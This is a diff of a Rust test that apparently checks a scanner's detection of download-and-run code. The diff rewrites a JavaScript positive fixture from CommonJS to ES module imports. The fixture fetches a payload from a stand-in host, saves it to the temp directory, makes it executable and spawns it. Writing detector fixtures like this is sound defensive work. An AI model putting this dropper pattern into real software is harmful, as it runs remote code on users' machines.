@@ -1640,13 +1640,14 @@ fn temporary_path_downloads_match_the_same_symbolic_spawn_target() {
     let root = temporary_directory("temporary-path-write-spawn");
     fs::write(
         root.join("positive.js"),
-        br#"const fs = require('fs'); const path = require('path'); const os = require('os'); const cp = require('child_process');
+        br#"import { join } from 'node:path'; import { tmpdir } from 'node:os';
+import { writeFile, chmodSync } from 'node:fs'; import { spawn } from 'node:child_process';
 async function boot() {
   const response = await fetch('https://example.invalid/payload');
-  const target = path.join(os.tmpdir(), 'payload.bin');
-  await fs.promises.writeFile(target, await response.text());
-  fs.chmodSync(target, 0o755);
-  cp.spawn(target);
+  const target = join(tmpdir(), 'payload.bin');
+  await writeFile(target, await response.text());
+  chmodSync(target, 0o755);
+  spawn(target);
 }
 boot();"#,
     )
